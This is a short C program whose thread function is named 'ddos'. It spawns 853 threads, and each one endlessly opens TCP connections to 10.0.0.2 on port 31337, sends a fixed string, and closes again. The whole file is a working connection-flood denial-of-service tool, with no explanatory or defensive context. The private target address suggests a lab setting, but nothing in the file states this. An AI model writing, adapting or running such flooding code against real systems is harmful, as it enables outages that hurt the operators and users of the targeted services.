#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>     // for close()
#include <arpa/inet.h>  // for inet_pton()
#include <sys/socket.h> // for socket functions
#include <netinet/in.h> // for sockaddr_in
#include <pthread.h>

void *ddos(void *dd)
{
    int sock;
    struct sockaddr_in server_addr;
    const char *server_ip = "10.0.0.2";
    int port = 31337;
    int count = 0;
    int fd;
    while (1)
    {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1)
        {
            perror("socket");
            exit(1);
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);

        // Convert IP address from text to binary form
        if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0)
        {
            write(1, "i\n", 2);
            continue;
            // perror("inet_pton");
            // close(sock);
            // exit(EXIT_FAILURE);
        }

        // 3. Connect to the server
         
        if ( connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
        {
            write(1, "c\n", 2);
            close(sock);
            continue;
            // perror("connect");
            // exit(EXIT_FAILURE);
        }

        // printf("$$$$$$$ %d\n", count);

        // 4. Optionally s
        write(sock, "123456789012345678901234567892345678\n", 38);
        // printf("hmm %d\n", sock);
        usleep(600);
        // close(fd);
        close(sock);
        count++;
    }
}

int main()
{
    int num = 853;
    pthread_t arr[num];
    int i = 0;
    while (i < num)
    {
        pthread_create(&arr[i], NULL, ddos, NULL);
        i++;
        //  printf("i = %d\n", i);
        
    }
    i = 0;
    while (i< num)
    {
        pthread_join(arr[i], NULL);
        i++;
    }
}
